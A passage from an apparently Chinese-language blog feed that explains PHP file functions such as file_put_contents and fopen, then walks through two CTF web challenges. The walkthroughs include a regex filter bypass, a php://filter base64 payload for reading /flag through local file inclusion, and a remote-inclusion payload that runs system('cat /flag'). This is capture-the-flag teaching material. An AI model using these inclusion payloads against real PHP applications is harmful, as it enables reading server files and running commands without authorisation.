align="left">必需。规定要写入文件的数据。可以是字符串、数组或数据流</td></tr><tr><td align="center">flag</td><td align="left">可选。规定如何打开&#x2F;写入文件。可能的值：<br /> FILE_USE_INCLUDE_PATH ：只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）搜索文件。<br />FILE_APPEND：如果设置了该标志，数据将被追加到文件末尾而不是覆盖文件内容。<br /> LOCK_EX：如果设置了该标志，在写入文件时会获取一个独占锁定（排它锁），以防止其他进程同时写入文件。这可以确保在多个进程同时写入文件时不会发生冲突。</td></tr><tr><td align="center">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><p>该函数访问文件时，遵循以下<strong>顺序</strong>：</p><ol><li>如果设置了 <code>FILE_USE_INCLUDE_PATH</code> 标志，函数将首先检查 <code>filename</code> 参数的副本是否存在于 PHP 的内置路径（include_path）中。</li><li>函数将打开文件以进行写入操作。</li><li>如果设置了 <code>LOCK_EX</code> 标志，函数将对文件进行锁定（获取独占锁定），以确保在写入文件时不会发生冲突。</li><li>如果设置了 <code>FILE_APPEND</code> 标志，函数将将写入的数据追加到文件末尾。否则，函数将清除文件的内容并写入新的数据。</li><li>函数将写入数据到文件中。</li><li>函数将关闭文件并释放对文件的所有锁定。</li></ol><p>​<br>​</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen() 函数打开一个文件或 URL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">必需。规定要打开的文件或 URL。</td></tr><tr><td align="left">mode</td><td align="left">必需。规定您请求到该文件&#x2F;流的访问类型。可能的值：”r” （只读方式打开，将文件指针指向文件头）”r+” （读写方式打开，将文件指针指向文件头）”w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）”w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）”a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）”a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）”x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）”x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li>参考<strong>PHP 手册</strong>的内容<br>原文链接：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></li><li>参考<strong>菜鸟教程</strong>的文章<br>原文链接：<a href="https://www.runoob.com/php/func-filesystem-fopen.html">https://www.runoob.com/php/func-filesystem-fopen.html</a></li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h1><h2 id="No-1-土豆哥给的题目"><a href="#No-1-土豆哥给的题目" class="headerlink" title="No.1 土豆哥给的题目"></a><strong>No.1 土豆哥给的题目</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;easy lfi, but no flag~~&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;first one:&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>土豆哥：flag一般在根目录下</strong><del>(根本没听到,做了很多无用功，但偶然接触到了一句话木马)</del></p><p><strong>题解：</strong> </p><p>​<code>$cmd = preg_replace(&quot;/flag/i&quot;, &#39;&#39;, $cmd);</code>这个正则表达式用于删除cmd中含有<code>flag</code>地方，第二个  <code>if (preg_match(&quot;/flag/i&quot;, $cmd))</code>用来判断是否含有flag这个词如果有则进行if下的内容。</p><p>​按题目的含义我们可以构造出<code>flflagag</code>这个作为flag的替代</p><p>​尝试直接进行<code>cmd=/flflagag</code>进行传参，发现并没有出现参数，判读估计进行了隐藏。使用php中的<strong>php:&#x2F;&#x2F;filter</strong>伪协议进行读取，使用<code>cmd=php://filter/read=convert.base64-encode/resource=/flag</code>尝试使用base64加密后读取。</p><p>​页面出现经过base64加密后的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>发现flag是个变量无法直接通过include包含直接读出。</p><h2 id="No-2-CTFHub-技能树-RCE-文件包含-远程包含"><a href="#No-2-CTFHub-技能树-RCE-文件包含-远程包含" class="headerlink" title="No.2 CTFHub 技能树-RCE-文件包含-远程包含"></a><strong>No.2 CTFHub 技能树-RCE-文件包含-远程包含</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><strong>页面给了个小提示</strong></p><p><strong>phpinfo</strong></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On</td><td>On</td></tr><tr><td>allow_url_include</td><td>On</td><td>On</td></tr></tbody></table><p><strong>题解：</strong></p><p>查看题目</p><p>​<code> if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))</code>发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件，里面写入能进行打印出根目录下flag的代码，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>http://</code>协议，最后成功获取代码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见协议与封装协议&quot;&gt;&lt;a href=&quot;#常见协议与封装协议&quot; class=&quot;headerlink&quot; title=&quot;常见协议与封装协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;常见协议与封装协议&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight php</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-PHP" scheme="https://we11s.github.io/tags/Web-PHP/"/>
    
  </entry>
  
</feed>
